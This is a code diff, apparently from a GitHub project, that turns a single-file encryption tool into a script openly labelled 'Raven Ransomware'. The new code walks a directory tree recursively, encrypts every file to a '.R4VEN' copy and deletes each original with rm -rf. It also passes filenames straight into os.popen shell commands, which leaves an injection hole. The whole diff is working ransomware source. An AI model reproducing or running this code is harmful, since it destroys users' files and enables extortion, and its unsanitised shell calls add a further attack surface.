@@ -4,88 +4,72 @@
 #  I am not responsible for improper or illegal uses
 #  Follow me on GitHub: https://github.com/th3r4ven
 
-from termcolor import cprint, colored
 import subprocess as command
-from ransomware_menager import decrypt, crypt
-import sys
+import os
+import re
+from ransomware_menager import crypt, decrypt
+
+print("[+]\t Raven Ransomware created by TH3R4VEN\n")
+print("1-Crypt 2-Decrypt")
+opt = int(input(">"))
 
 
-def reset():
-    command.run("clear")
+def listDirectories(Dirpath):
+    for resultado in os.listdir(Dirpath):
+        result2 = os.popen("file " + Dirpath + resultado)
+        for arq in result2:
+            if not re.search(r'directory', arq):
+                files.append(Dirpath + resultado)
+            else:
+                listDirectories(Dirpath + resultado + "/")
 
 
-def options():
-    cprint("Select an option from the menu:", 'red')
-    cprint(' 1) Crypt file', 'red')
-    cprint(' 2) Decrypt File', 'red')
-    cprint(' 3) Exit\n\n', 'red')
-    return int(input(colored("option>", 'cyan')))
+if opt == 1:
+    path = "directory path to encrypt (full path works better /home/kali/Documents/)" # Remember to put a / at the end
+    files = []
+    directories = []
+    listagem = (os.listdir(path))
 
+    for file in listagem:
+        result = os.popen("file " + path + file)
+        for resu in result:
+            if not re.search(r"directory", resu):
+                files.append(str(path + file))
+            else:
+                directories.append(path + file + "/")
 
-def main():
+    for direc in directories:
+        listDirectories(direc)
 
-    try:
-        reset()
-        resp = options()
+    for arquivo in files:
+        with open(arquivo, 'rb') as arq:
+            content = arq.read()
+        arq.close()
+        cryptedContent = crypt(content)
 
-        if resp == 1:
-            pwd = command.getoutput('pwd')
-            cprint("Your current working directory: " + str(pwd), 'red')
+        filePath = arquivo.split('.')[0]
+        with open(filePath + ".R4VEN", 'wb') as arq:
+            arq.write(cryptedContent)
+        arq.close()
 
-            cprint("\nInsert the file path:\n", 'red')
-            file = input(colored("File>", 'cyan'))
+        command.run(['rm', '-rf', arquivo])
 
-            with open(file, 'rb') as arq:
-                content = arq.read()
-            arq.close()
-            content = crypt(content)
+elif opt == 2:
+    print("Current working directory: " + command.getoutput('pwd'))
+    decryptFilePath = input("Path to file> ")
 
-            with open(file, 'wt') as arq:
-                arq.write(content)
-            arq.close()
+    if re.search(r'.R4VEN', decryptFilePath):
+        with open(decryptFilePath, 'rb') as arq:
+            content = arq.read()
+        arq.close()
 
-            cprint("\nYour file has been successfully encrypted.\n", 'red')
-            cprint("\nPress any key to return to main menu\n")
-            input(colored("Key>", 'cyan'))
-            main()
+        content = decrypt(content)
+        filePath = decryptFilePath.split('.R4VEN')[0]
+        with open(filePath, 'wb')as arq:
+            arq.write(content)
+        arq.close()
 
-        elif resp == 2:
-            pwd = command.getoutput('pwd')
-            cprint("Your current working directory: " + str(pwd), 'red')
+        command.run(['rm', '-rf', decryptFilePath])
 
-            cprint("\nInsert the file path:\n", 'red')
-            file = input(colored("File>", 'cyan'))
-
-            cprint("\nInsert the encrypt key:\n", 'red')
-            key = input(colored("Key>", 'cyan'))
-
-            with open(file, 'rt') as arq:
-                content = arq.read()
-            arq.close()
-
-            content = decrypt(content, key)
-
-            with open(file, 'wb') as arq:
-                arq.write(content)
-            arq.close()
-
-            cprint("\nYour file has been successfully decrypted.\n", 'red')
-            cprint("\nPress any key to return to main menu\n")
-            input(colored("Key>", 'cyan'))
-            main()
-        elif resp == 3:
-            print("\n\n[-] Exiting....\n")
-            exit()
-        else:
-            main()
-    except KeyboardInterrupt:
-        print("\n\n[-] Exiting....\n")
-        exit()
-    except ValueError:
-        pass
-
-
-main()
-
-
-
+else:
+    exit()
